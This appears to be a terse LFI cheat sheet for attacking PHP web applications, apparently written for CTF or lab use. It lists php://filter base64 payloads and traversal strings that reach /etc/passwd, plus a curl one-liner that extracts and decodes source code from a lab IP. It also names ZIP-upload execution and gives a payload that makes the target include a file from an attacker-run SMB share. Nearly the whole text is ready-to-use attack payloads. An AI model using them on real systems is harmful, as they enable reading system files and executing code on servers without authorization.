php:filters

?file=php://filter/convert.base64-encode/resource=index.php

....//....//....//....//....//....//....//....//....//....//....//etc/passwd

/etc/passwd%00


curl -sD - 10.10.10.80/?op=php://filter/convert.base64-encode/resource=home | head -44 | tail -1 | cut -d' ' -f1 | base64 -d > home.php


##	ZIP file upload and Execute it via the zip file filter

>	ZIP file upload and Execution via PHP zip filter


##	LFI with SAMBA

[+]	Start samba server locally [START THE SERVER]
	
[+]	lang=\\10.10.14.2\share\abc.txt